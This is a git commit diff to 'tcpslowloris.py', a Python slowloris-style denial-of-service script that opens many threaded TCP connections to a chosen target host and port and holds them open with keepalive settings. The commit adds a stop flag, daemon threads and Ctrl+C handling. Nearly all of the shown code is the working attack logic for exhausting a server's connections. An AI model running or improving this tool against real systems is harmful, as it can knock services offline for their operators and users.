dfab8035871440cb3a575f3399b829975b0f008d
yaniv <yyagol@gmail.com>
2018-07-06 10:17:23 +0300

    close all threads when Ctrl+c pressed

--- tcpslowloris.py
+++ tcpslowloris.py
@@ -13,22 +13,34 @@ parser.add_argument("--target" ,help="Target host")
 parser.add_argument("--port" ,help="Target port" , type=int)
 args = parser.parse_args()
 
+global run_loop
+run_loop = True
+
+
 def worker():
     s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
     s.connect((args.target, args.port))
     s.setsockopt(socket.SOL_SOCKET, socket.SO_KEEPALIVE,  1)
     s.setsockopt(socket.IPPROTO_TCP, socket.TCP_KEEPIDLE, 1)
-    s.setsockopt(socket.IPPROTO_TCP, socket.TCP_KEEPINTVL, 23)
+    s.setsockopt(socket.IPPROTO_TCP, socket.TCP_KEEPINTVL,23)
     s.setsockopt(socket.IPPROTO_TCP, socket.TCP_KEEPCNT, 5)
-    while True:
-        time.sleep(5)
+    while run_loop:
+        time.sleep(1)
     return
 
 threads = []
 for i in range(int(args.total/args.pulse)):
     for pulse in range(args.pulse):
         t = threading.Thread(target=worker)
+        t.daemon = True
         threads.append(t)
         t.start()
-    print("Current sockets : %d" % int((i+1)*args.pulse))
+    print("Current sockets started: %d" % int((i+1)*args.pulse))
     time.sleep(args.delay)
+
+try:
+    while True:
+        time.sleep(1)
+except KeyboardInterrupt:
+    run_loop = False
+
